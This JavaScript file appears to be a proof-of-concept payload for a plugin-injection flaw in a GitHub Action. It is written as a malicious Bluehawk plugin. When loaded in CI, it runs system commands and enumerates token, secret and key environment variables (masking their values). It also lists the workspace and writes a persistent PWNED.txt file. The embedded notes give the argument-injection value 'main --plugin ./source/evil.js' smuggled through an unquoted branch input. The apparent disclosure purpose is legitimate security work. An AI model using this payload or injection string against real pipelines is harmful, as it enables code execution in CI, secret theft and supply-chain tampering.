// Malicious Bluehawk plugin - executes arbitrary code when loaded
const { execSync } = require('child_process');
const fs = require('fs');

console.log('');
console.log('🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨');
console.log('🚨       REMOTE CODE EXECUTION ACHIEVED!                    🚨');
console.log('🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨');
console.log('');

// Execute commands and log results
try {
  console.log('=== System Information ===');
  console.log('Whoami:', execSync('whoami').toString().trim());
  console.log('Hostname:', execSync('hostname').toString().trim());
  console.log('PWD:', execSync('pwd').toString().trim());
  console.log('');
  
  console.log('=== Environment Variables (SECRETS!) ===');
  // Only show relevant env vars to avoid too much output
  const env = process.env;
  const sensitiveKeys = Object.keys(env).filter(k => 
    k.includes('TOKEN') || 
    k.includes('SECRET') || 
    k.includes('KEY') ||
    k.includes('GITHUB') ||
    k.includes('INPUT')
  );
  
  sensitiveKeys.forEach(key => {
    const value = env[key];
    // Mask actual secrets but show they exist
    if (key.includes('TOKEN') || key.includes('SECRET') || key.includes('KEY')) {
      console.log(`${key}: [REDACTED - ${value ? value.length : 0} chars]`);
    } else {
      console.log(`${key}: ${value}`);
    }
  });
  
  console.log('');
  console.log('=== File System Access ===');
  console.log('Workspace contents:', execSync('ls -la /github/workspace').toString());
  
  // Write proof file to workspace (this persists!)
  const proofPath = '/github/workspace/PWNED.txt';
  fs.writeFileSync(proofPath, `
RCE PROOF - Plugin Injection Vulnerability
==========================================
Time: ${new Date().toISOString()}
User: ${execSync('whoami').toString().trim()}
Host: ${execSync('hostname').toString().trim()}

This file was created by a malicious Bluehawk plugin
that was injected via the unquoted $INPUT_BRANCH variable
in mongodb/push-to-artifact-repo's entrypoint.sh

Attack vector:
  branch: "main --plugin ./source/evil.js"

Impact:
  - Full code execution in CI environment
  - Access to all GitHub secrets and tokens
  - Ability to modify repository contents
  - Potential supply chain attack vector
`);
  console.log('');
  console.log('✅ Proof file written to:', proofPath);
  
} catch (e) {
  console.log('Error:', e.message);
}

console.log('');
console.log('🚨🚨🚨 END OF MALICIOUS PAYLOAD 🚨🚨🚨');
console.log('');

exports.register = () => {
  console.log('Plugin register() completed');
};
